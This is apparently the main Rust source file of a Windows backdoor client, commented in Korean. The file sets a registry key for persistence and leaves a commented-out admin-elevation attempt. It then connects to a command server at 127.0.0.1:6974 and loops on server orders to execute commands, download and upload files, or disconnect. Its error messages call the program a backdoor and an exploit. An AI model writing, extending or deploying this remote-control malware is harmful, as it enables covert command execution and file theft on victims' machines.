mod exploits;
mod stprotocol;
mod structure;

use bstr::ByteSlice;
use exploits::{is_elevated, setup_registry, try_run_as_admin, Exploits, Malware};
use std::{
    io::{Read, Write},
    thread,
};
use stprotocol::{Client, Session};
use structure::{Detector, Generator, StoneTransferProtocol, StructStone};

fn main() {
    // if let p = !is_admin() {
    //     println!("관리자 권한 없음 {:?}", p);
    //     if is_elevated() {
    //         match try_run_as_admin() {
    //             Ok(_) => {}
    //             Err(_) => eprintln!("Exploitation failed: Starting backdoor with basic privileges"),
    //         }
    //     }
    // }

    match setup_registry() {
        Ok(_) => {}
        Err(_) => eprintln!(
            "Exploit Failure: Failed to register registry key, resulting in insecure execution."
        ),
    }

    let handle_server = thread::spawn(|| {
        event_loop(
            Session::new("127.0.0.1:6974".to_string()),
            StructStone::default(),
        )
    });

    handle_server
        .join()
        .expect("Connection to server is lost for unknown reasons. Backdoor terminated.");
}

fn event_loop(mut client: Session, mut packet: StructStone) {
    let mut exploit = Exploits::default();

    loop {
        // 새션 생성후 서버와 지속적인 통신을 위한 루프문

        packet = client.receiving(StructStone::default()); // 연결요청후 서버의 응답 대기

        println!("서버 응답타입: {:?}", packet.get_type());

        match packet.get_type() {
            // 서버의 응답 타입을 비교하여 보낼 요청을 생성함
            StoneTransferProtocol::ExecuteCmd => {
                // 타입이 ExecuteCmd 일 경우
                client.exploit(exploit.command(packet));
            }
            StoneTransferProtocol::Download => {
                // 타입이 Download 일 경우
                client.download(packet);
            }
            StoneTransferProtocol::Upload => {
                // 타입이 Upload 일 경우
                client.upload(packet);
            }
            StoneTransferProtocol::Disconnect => {
                client.disconnect();
                break;
            } // 만약 서버의 응답이 Disconnect 일 경우 연결을 종료한다

            _ => client.send(packet.get_stone()), //만약 위의 응답 타입을 제외한 응답을 보낼경우 서버의 응답과 같은 요청을 전송함
        };
    }
}
